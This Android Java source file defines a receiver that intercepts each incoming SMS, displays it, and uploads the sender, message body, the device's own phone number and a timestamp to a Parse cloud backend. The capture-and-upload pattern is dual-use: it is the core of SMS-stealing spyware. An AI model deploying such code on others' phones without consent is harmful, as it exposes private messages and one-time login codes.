package com.example.receivecallsms;

import com.parse.ParseObject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

public class SmsListener extends BroadcastReceiver{

    private SharedPreferences preferences;
    ParseObject IncomingSMSs = null;

    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO Auto-generated method stub

        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
            Bundle bundle = intent.getExtras();           //---get the SMS message passed in---
            SmsMessage[] msgs = null;
            String msg_from;
            if (bundle != null){
                //---retrieve the SMS message received---
                try{
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    msgs = new SmsMessage[pdus.length];
                    for(int i=0; i<msgs.length; i++){
                        msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                        msg_from = msgs[i].getOriginatingAddress();
                        String msgBody = msgs[i].getMessageBody();
                        
                        // Get SMS Details
                        TelephonyManager telephony = (TelephonyManager) 
                        context.getSystemService(Context.TELEPHONY_SERVICE);
            			String myPhoneNumber = telephony.getLine1Number();
            			Long tsLong = System.currentTimeMillis()/1000;
            			String ts = tsLong.toString();
            			
            			// Display Received SMS 
                        String recvdSMS = "Text from:--- "+msg_from+"\nMsg:--- "+msgBody+"\nReceived Time:--- "+ts;
                        Toast.makeText(context, recvdSMS, Toast.LENGTH_LONG).show();
                        
            			// Upload to Parse
            			IncomingSMSs = new ParseObject("IncomingSMSs");
                        IncomingSMSs.put("Destination", myPhoneNumber);
                        IncomingSMSs.put("Source", msg_from);
                        IncomingSMSs.put("body", msgBody);
                        IncomingSMSs.put("date", ts);
                        IncomingSMSs.saveInBackground();
                    }
                }catch(Exception e){
                	Log.d("Exception caught",e.getMessage());
                }
                
            }
        }
    }
}
